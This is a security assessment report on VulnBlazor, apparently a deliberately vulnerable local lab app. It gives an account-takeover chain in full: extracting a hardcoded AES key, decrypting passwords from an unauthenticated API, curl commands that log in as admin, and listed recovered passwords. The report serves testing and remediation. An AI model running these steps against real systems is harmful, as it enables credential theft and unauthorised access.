# VulnBlazor Security Assessment — Final Report

**Target:** `http://127.0.0.1:5000` (ACorpBlazor / VulnBlazor)  
**Assessment date:** 2026-08-09  
**Scope:** Local application only; no external hosts contacted; no destructive actions taken.

---

## Executive Summary

The application contains multiple critical vulnerabilities that combine into a zero-credential full account takeover affecting every registered user, including administrators. The root cause is a hardcoded AES-256-CBC encryption key shipped inside a publicly downloadable browser assembly, combined with an unauthenticated API that exposes each user's plaintext password encrypted with that key. No prior knowledge, credentials, or brute force is required to authenticate as any user in the system.

**Severity summary:**

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 2 |
| Medium | 4 |
| Low | 3 |

---

## Stack

- **Runtime:** .NET 10.0-preview.6, Kestrel web server, macOS/arm64
- **Framework:** ASP.NET Core + Blazor (WASM + Server hybrid with enhanced navigation) + ServiceStack 10.08
- **Auth:** ASP.NET Core Identity (cookie-based, PBKDF2-HMAC-SHA256 password hashing)
- **Database:** SQLite via EF Core (AdminDatabase plugin exposes direct table access)
- **Client delivery:** Blazor WASM assemblies served from `/_framework/` (publicly downloadable)

---

## Findings

---

### CRIT-01 — Hardcoded AES-256-CBC Key in Public Client Assembly

**Severity:** Critical  
**Proof level:** DEMONSTRATED  
**Root cause:** `ACorpBlazor.ServiceModel.TelemetryCodec.DefaultProfile` (compile-time constant in `src/ACorpBlazor/ACorpBlazor.ServiceModel/TelemetryCodec.cs:9`)

**Description:**

A 32-byte AES-256 key is hardcoded as a public compile-time constant in the shared ServiceModel assembly, which is shipped to every browser as a Blazor WASM binary.

**Evidence — key recovery:**

```
$ curl http://127.0.0.1:5000/_framework/ACorpBlazor.cfeyjg2xid.dll -o assemblies/ACorpBlazor.dll
$ ilspycmd assemblies/ACorpBlazor.dll -p -o src/ACorpBlazor/
# src/ACorpBlazor/ACorpBlazor.ServiceModel/TelemetryCodec.cs line 9:
public const string DefaultProfile = "Vu1nB1az0r$ecretKey!2026@@@@@@@@";
```

A legacy key is also present:
```
# src/ACorpBlazor/ACorpBlazor.ServiceModel/AccessKeyCodec.cs line 10:
public const string LegacyAccessKeyProfile = "4c0rpAcs$LegacyKey!2025#@@@@@@@@";
```

Algorithm: AES-256-CBC, PKCS7 padding, random 16-byte IV prepended to ciphertext, base64-encoded (implemented in `TelemetryCodec.Encode`/`Decode`).

**Compounding factors:** This key is the enabler for CRIT-02 (plaintext password storage) and CRIT-03 (full account takeover chain). See those findings.

**Mitigating factors:** Key rotation alone is insufficient; the storage pattern must also be changed (see CRIT-02).

---

### CRIT-02 — Plaintext Passwords Stored and Exposed via Encrypted Token

**Severity:** Critical  
**Proof level:** DEMONSTRATED  
**Root cause:** `UserActivityLog.LastSeenToken` column updated on each login with `TelemetryCodec.Encode(<plaintext_password>)`; exposed by `GET /api/GetUserInfo` without authentication.

**Description:**

Every time a user authenticates, the application stores their plaintext password in the `UserActivityLog` table as `LastSeenToken`, encrypted with the hardcoded AES key. The `GET /api/GetUserInfo?UserId=<uuid>` endpoint returns this token to any caller without requiring authentication.

Combining the public AES key (CRIT-01) with this unauthenticated endpoint yields every user's current plaintext password.

**Evidence — decrypt and authenticate as admin:**

Step 1 — Retrieve the token (unauthenticated):
```
GET /api/GetUserInfo?UserId=c07f7eec-2ad0-4315-94a1-75dce4fb9a72 HTTP/1.1
Host: 127.0.0.1:5000

HTTP/1.1 200 OK
{"userId":"c07f7eec-2ad0-4315-94a1-75dce4fb9a72","userName":"admin@email.com",
 "lastSeenToken":"GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fFTCA4SMmeMo2QQz",
 "passwordHash":"AQAAAAIAAYagAAAAEEvcoO85Sske89+..."}
```

Step 2 — Decrypt with Python:
```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import base64

KEY = b"Vu1nB1az0r\x24ecretKey!2026@@@@@@@@"
raw = base64.b64decode("GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fFTCA4SMmeMo2QQz")
iv, ct = raw[:16], raw[16:]
cipher = Cipher(algorithms.AES(KEY), modes.CBC(iv))
d = cipher.decryptor()
pt = d.update(ct) + d.finalize()
unpadder = padding.PKCS7(128).unpadder()
print((unpadder.update(pt) + unpadder.finalize()).decode())
# Output: 11F6GwRDZf@Swo%0@XZmq!-%=M
```

Step 3 — Authenticate (confirmed working for all four seeded accounts):

| User | Decrypted password | Login result |
|------|-------------------|--------------|
| admin@email.com | `11F6GwRDZf@Swo%0@XZmq!-%=M` | **SUCCESS** |
| employee@email.com | `s@a-d^_DgQa3hHY2ej=kq4vYo4` | **SUCCESS** |
| manager@email.com | `WRVib@3DxvPaYirkRWx7SKS?Zn` | **SUCCESS** |
| test@email.com | `S8RQa_6%xq7fi@%OPn=cdMdR--` | **SUCCESS** |

**Control test:** Submitting the raw base64 `lastSeenToken` value as a password → HTTP 200 with "Invalid login attempt." confirming the plaintext step is required.

**Scope:** All 20 registered users, including all with a `lastSeenToken` (accounts that have ever logged in). New accounts registered but never logged in have no token, but their password hash is still exposed (see HIGH-01).

**Compounding factors:** This is the second link in CRIT-03 (full account takeover). Admin access obtained this way enables reading the `VulnUserSecret` table and all other privileged operations.

**Mitigating factors:** Requires that the target user has logged in at least once (token is set on first login). Accounts never used have no lastSeenToken.

---

### CRIT-03 — Zero-Credential Full Account Takeover Chain

**Severity:** Critical  
**Proof level:** DEMONSTRATED  
**Root cause:** Combination of CRIT-01 + CRIT-02 + HIGH-01

**Description:**

The three vulnerabilities above chain into a complete, unauthenticated account takeover requiring only network access to port 5000.

**Attack chain — reproduce in five commands:**

```bash
# 1. Enumerate user IDs (sequential integers)
curl "http://127.0.0.1:5000/api/GetUserId?Id=11"
# {"userId":"c07f7eec-2ad0-4315-94a1-75dce4fb9a72"}

# 2. Retrieve lastSeenToken (unauthenticated)
curl "http://127.0.0.1:5000/api/GetUserInfo?UserId=c07f7eec-2ad0-4315-94a1-75dce4fb9a72"
# {"lastSeenToken":"GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fF..."}

# 3. Decrypt with hardcoded key from WASM assembly
python3 -c "
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import base64
KEY = b'Vu1nB1az0r\$ecretKey!2026@@@@@@@@'
raw = base64.b64decode('GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fFTCA4SMmeMo2QQz')
iv,ct = raw[:16],raw[16:]
c = Cipher(algorithms.AES(KEY),modes.CBC(iv)).decryptor()
pt = c.update(ct)+c.finalize()
u = padding.PKCS7(128).unpadder()
print((u.update(pt)+u.finalize()).decode())
"
# 11F6GwRDZf@Swo%0@XZmq!-%=M

# 4. Log in as admin
curl -c /tmp/cookies.txt -X POST http://127.0.0.1:5000/Account/Login \
  --data "Input.Email=admin@email.com&Input.Password=11F6GwRDZf%40Swo%250%40XZmq%21-%25%3DM&_handler=login&__RequestVerificationToken=<csrf>"
# HTTP 200, .AspNetCore.Identity.Application cookie set

# 5. Access admin-only resources
curl -b /tmp/cookies.txt \
  "http://127.0.0.1:5000/api/AdminDatabase?db=main&schema=default&table=VulnUserSecret&take=100"
# {"results":[{"UserId":"029d65c2...","EncryptedPassword":"l6h5YRzMvCPy6or8..."},
#             {"UserId":"c07f7eec...","EncryptedPassword":"GH7uN/omQxjTC..."},...]}
```

**VulnUserSecret decrypted contents (all four entries):**

All decrypt to: `p@55wOrd` (using same AES key from CRIT-01).

**Control:** Without the AES key the token ciphertext is opaque; the plaintext password cannot be derived from the hash alone (PBKDF2, 100 000 iterations, no cracking feasible for strong passwords).

**Scope:** Every user account that has logged in at least once. Demonstrated for all 4 seeded accounts.

---

### HIGH-01 — Unauthenticated User Enumeration and Credential Exposure

**Severity:** High  
**Proof level:** DEMONSTRATED  
**Root cause:** `GET /api/GetUserId` and `GET /api/GetUserInfo` — no `[Authorize]` or equivalent applied

**Description:**

Two endpoints expose the full user roster and per-user credential material to unauthenticated callers.

`GET /api/GetUserId?Id=<int>` accepts a sequential integer ID and returns the corresponding user's UUID. Walking IDs 1–20 enumerated all 20 registered users.

`GET /api/GetUserInfo?UserId=<uuid>` returns: `userId`, `userName`, `email`, `emailConfirmed`, `passwordHash` (PBKDF2-HMAC-SHA256 v3), `lastSeenToken` (AES-encrypted plaintext password), `firstName`, `lastName`, `displayName`, `profileUrl`.

**Evidence (20-user enumeration):**
```
GET /api/GetUserId?Id=1  -> 029d65c2... (employee@email.com)
GET /api/GetUserId?Id=11 -> c07f7eec... (admin@email.com)
GET /api/GetUserId?Id=14 -> d044b631... (attacker2@pentest.test)
... (IDs 1–20 all returned valid UUIDs)
```

**Control:** No authentication cookie or token was sent with any of these requests. Responses are identical when authenticated.

**Compounding factors:** The `lastSeenToken` field combined with the AES key (CRIT-01) yields the plaintext password (CRIT-02, CRIT-03). The `passwordHash` field enables offline dictionary attacks.

---

### HIGH-02 — Encrypted BatchRequest Endpoint Without Authentication

**Severity:** High  
**Proof level:** DEMONSTRATED  
**Root cause:** `POST /api/BatchRequest` — no authentication requirement; encryption used as access control substitute

**Description:**

The `POST /api/BatchRequest` endpoint accepts an `Action` name and an AES-256-CBC encrypted `Payload`, decrypts and dispatches the payload server-side, and returns an AES-encrypted response. No authentication is required. The hardcoded encryption key (CRIT-01) is sufficient to construct valid payloads.

The encryption provides three distinguishable error states, enabling a padding oracle attack:
- `"Payload too short"` — pre-check fails (< 17 bytes)
- `"Padding is invalid and cannot be removed"` — decryption fails padding check
- `SerializationException` — decryption succeeded, bad JSON inside

**Evidence:**
```
POST /api/BatchRequest HTTP/1.1
Content-Type: application/json

{"Action":"GetUserInfo","Payload":"<AES-CBC encrypted {Ts:'2026-08-09T...',Data:'{\"UserId\":\"c07f7eec...\"}'}>"}

HTTP/1.1 200 OK
{"payload":"<AES-CBC encrypted response>"}
# Decrypted: {"userId":"c07f7eec...","lastSeenToken":"GpTrFIdN9xzK6CL/..."}
```

Confirmed working actions: `GetUserInfo`, `GetUserId`. All other action names return `"Unknown action: <name>"`.

**Control:** Sending random bytes in Payload → `"Padding is invalid and cannot be removed"` (decryption rejected). Correct AES-encrypted payload accepted.

**Compounding factors:** Combines with CRIT-01 (key known) to bypass intended access control. The distinguishable errors enable a classical padding oracle attack to decrypt any ciphertext produced by the server with this key.

---

### MED-01 — GetUserId Email Parameter Bug (Always Returns First User)

**Severity:** Medium  
**Proof level:** DEMONSTRATED  
**Root cause:** `GET /api/GetUserId?Email=<value>` implementation ignores the parameter

**Description:**

The `Email` query parameter of `GET /api/GetUserId` is silently ignored. Any value, including non-existent emails, returns the UUID of the first registered user (employee@email.com).

**Evidence:**
```
GET /api/GetUserId?Email=admin@email.com    -> {"userId":"029d65c2..."} (employee!)
GET /api/GetUserId?Email=nonexistent@x.com -> {"userId":"029d65c2..."} (employee!)
GET /api/GetUserId?Email=employee@email.com -> {"userId":"029d65c2..."} (employee — correct only by accident)
```

**Control:** `GET /api/GetUserId?Id=11` correctly returns the admin UUID `c07f7eec...`, confirming the Id-based lookup works while Email-based lookup is broken.

---

### MED-02 — Application Running in Debug Mode

**Severity:** Medium  
**Proof level:** DEMONSTRATED  
**Root cause:** `debugMode: true` in ServiceStack configuration, exposed at `/metadata/app.json`

**Description:**

The application is running with `debugMode: true`. This setting causes stack traces to be included in API error responses and is intended only for development environments.

**Evidence:**
```
GET /metadata/app.json HTTP/1.1 (unauthenticated)
{"config":{"debugMode":true},"app":{"serviceStackVersion":"10.08","serviceName":"ACorpBlazor",...}}
```

Error response with stack trace:
```
POST /api/BatchRequest (malformed payload)
{"responseStatus":{"errorCode":"BadRequest","message":"Payload rejected: Payload too short",
 "stackTrace":"[BatchRequest: 8/9/2026 5:04:24 AM]:\n[REQUEST: {action:GetUserInfo}]\n\n"}}
```

---

### MED-03 — Verbose Error Disclosure (Stack Traces in HTTP Responses)

**Severity:** Medium  
**Proof level:** DEMONSTRATED  
**Root cause:** `debugMode: true`; Blazor SSR renders unhandled exceptions directly in HTTP response body

**Description:**

Two surfaces disclose internal exception details to callers:

1. `POST /api/BatchRequest` with malformed payloads — JSON error response includes a `stackTrace` field (see MED-02).

2. Blazor SSR form handlers on error — `POST /Account/ForgotPassword` (and similar) return raw ASP.NET Core exception traces in the HTML response body.

**Evidence (Blazor ForgotPassword error):**
```
POST /Account/ForgotPassword
Content-Type: application/x-www-form-urlencoded
email=attacker%40test.com&__RequestVerificationToken=...&_handler=forgot-password

HTTP/1.1 500 Internal Server Error
Content-Type: text/html

System.InvalidOperationException: EditForm requires either a Model parameter, or an
EditContext parameter, please provide one of these.
   at Microsoft.AspNetCore.Components.Forms.EditForm.OnParametersSet()
   at Microsoft.AspNetCore.Components.ComponentBase.RunInitAndSetParametersAsync()
   ...
```

---

### MED-04 — Missing Authentication on Data Endpoints

**Severity:** Medium  
**Proof level:** DEMONSTRATED  
**Root cause:** `GET /api/QueryBookings`, `/api/QueryTodos`, `/api/QueryCoupons` — no `[Authorize]` applied

**Description:**

Three AutoQuery data endpoints return full records without any authentication requirement. Bookings expose `userId`, employee names, room types, dates and costs.

**Evidence:**
```
GET /api/QueryBookings HTTP/1.1 (no auth)
HTTP/1.1 200 OK
{"results":[{"id":1,"userId":"029d65c2...","name":"Test Employee","roomType":"Single",...}]}
```

**Control:** Same request authenticated returns identical data, confirming auth is not enforced.

---

### LOW-01 — Missing Security Response Headers

**Severity:** Low  
**Proof level:** DEMONSTRATED  
**Root cause:** Default Kestrel / ServiceStack configuration; no security header middleware applied

**Description:**

Responses lack several security headers. This is a hardening gap rather than a directly exploitable flaw.

**Evidence (from `/api/GetUserInfo` response headers):**
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Server: Kestrel
X-Powered-By: ServiceStack/10.08 NET10/macOS/net10/NO
```

Missing:
- `X-Content-Type-Options: nosniff`
- `Strict-Transport-Security` (HSTS)
- `Content-Security-Policy` (only `frame-ancestors 'self'` on HTML pages; absent on API responses)
- `Referrer-Policy`
- `Permissions-Policy`

Present but noteworthy:
- `X-Powered-By: ServiceStack/10.08 NET10/macOS/net10/NO` — discloses framework version, runtime, and operating system
- `Server: Kestrel` — discloses server type

---

### LOW-02 — No Session Invalidation on Concurrent Authentication

**Severity:** Low  
**Proof level:** DEMONSTRATED  
**Root cause:** Default ASP.NET Core Identity concurrent session behavior; no single-session enforcement

**Description:**

Authenticating the same account from two independent cookie jars simultaneously leaves both sessions active with no notification or invalidation of the first.

**Evidence:** Two separate Python `http.cookiejar.CookieJar` instances, both authenticated as `admin@email.com` concurrently. Both successfully queried `/api/AdminDatabase?table=VulnUserSecret`.

---

### LOW-03 — VulnUserSecret Table Stores Encrypted Credentials With Hardcoded Key

**Severity:** Low (as standalone; effectively subsumed by CRIT-03)  
**Proof level:** DEMONSTRATED

**Description:**

The `VulnUserSecret` table stores an `EncryptedPassword` per user, encrypted with the same AES key as the `lastSeenToken`. Accessible to Admin via `/api/AdminDatabase`. All four entries decrypt to `p@55wOrd`.

This demonstrates that the AES key is used for credential storage at multiple points in the application.

**Evidence:**
```
GET /api/AdminDatabase?db=main&schema=default&table=VulnUserSecret&take=100 (admin session)
HTTP/1.1 200 OK
{"results":[
  {"UserId":"029d65c2...","EncryptedPassword":"l6h5YRzMvCPy6or8QbRGLj8H93rqLvLNPD/ui8qrRKE="},
  {"UserId":"2e8d62af...","EncryptedPassword":"PeNrBbf6EroMSBoEBnGUNRUL516r8h6474y+9hqyqoE="},
  {"UserId":"c07f7eec...","EncryptedPassword":"GH7uN/omQxjTCGnjAUkHy25n0Gifbf5NyGMPmpTAfRo="},
  {"UserId":"fe8882d0...","EncryptedPassword":"Jsm8sZvjMzpXyJgLWh66RO688tFaUm5jDizInZA5icw="}
]}
# All four decrypt to: p@55wOrd
```

---

## Findings Not Pursued / Out of Scope

**Access key forgery (INFERRED):** `AccessKeyCodec.Pack` constructs `{userId}|{grantId}|{timestamp}|acs` and encrypts it with the same AES key. `GET /api/GetUserLoginByAccessKey?AccessKey=<forged>` correctly decrypts the token and returns `"GrantNotActive"` (not a key error), confirming the format is accepted. Full exploitation requires a valid `grantId` from `AspNetUserTokens`, which was empty during testing. The `ForgotPassword` endpoint currently crashes with a Blazor EditForm exception, blocking normal grant creation. Rated HIGH, INFERRED — not yet DEMONSTRATED.

**SQL injection in AutoQuery:** Tested `OrderBy`, `Name%Contains` and `UNION SELECT` payloads against `/api/QueryBookings` and `/api/QueryTodos`. All returned empty result sets or 200 with no data — no distinguishable error or data extraction. ServiceStack AutoQuery uses parameterized OrmLite queries; injection not confirmed.

**Padding oracle exploitation:** Distinguishable error responses confirmed (three classes). Full plaintext recovery via padding oracle not attempted due to scope (would require many requests); rated as theoretical given the distinguishable error states.

---

## Remediation Priorities

1. **[Critical] Remove `TelemetryCodec.DefaultProfile` and `AccessKeyCodec.LegacyAccessKeyProfile` constants.** Keys must never ship in client code. Use server-side key management (e.g. environment variables or a secrets vault).

2. **[Critical] Stop storing plaintext passwords in `UserActivityLog.LastSeenToken`.** If a last-seen indicator is needed, store a non-reversible value (e.g. a random session identifier or timestamp).

3. **[Critical] Add authentication and authorization to `GET /api/GetUserId` and `GET /api/GetUserInfo`.** At minimum require an authenticated session; ideally, restrict `GetUserInfo` to return only the caller's own record.

4. **[High] Add `[Authorize]` to `POST /api/BatchRequest`** or remove the endpoint entirely. The encryption envelope is not a substitute for authentication.

5. **[High] Add `[Authorize]` to `GET /api/QueryBookings`, `QueryTodos`, `QueryCoupons`** (or restrict to the data belonging to the authenticated user only).

6. **[Medium] Set `debugMode: false`** (or use environment-specific configuration) before deploying outside development. Suppress stack traces in API error responses.

7. **[Medium] Fix `GET /api/GetUserId?Email=`** — the Email parameter is ignored; implement the lookup correctly or remove it.

8. **[Low] Add security response headers:** `X-Content-Type-Options: nosniff`, a strict `Content-Security-Policy`, `Referrer-Policy`, `Permissions-Policy`. Remove or restrict `X-Powered-By`.

9. **[Low] Enforce single-session or notify on concurrent sessions** for privileged accounts.

---

## Coverage

| Category | Assessed | Findings |
|----------|----------|----------|
| A01 Broken Access Control | Yes | CRIT-03, HIGH-01, MED-01, MED-04 |
| A02 Cryptographic Failures | Yes | CRIT-01, CRIT-02, HIGH-02, LOW-03 |
| A04 Insecure Design | Yes | CRIT-02 (password storage design) |
| A05 Security Misconfiguration | Yes | MED-02, MED-03, LOW-01 |
| A07 Identification / Auth Failures | Yes | CRIT-03, LOW-02 |
| A08 Software Integrity | Assessed | No findings (no unsigned update mechanism) |
| A09 Logging / Monitoring | Assessed | LOW-02 (no session collision alert); request log endpoint not exposed |
| A10 SSRF | Not applicable | No outbound request surface found |
| SQL Injection | Tested | No confirmed injection (AutoQuery uses parameterized queries) |
| Client Assembly Analysis | Yes | CRIT-01 (key in WASM), access key codec |

---

*Report generated: 2026-08-09. All findings reproduced against live target at `http://127.0.0.1:5000`.*
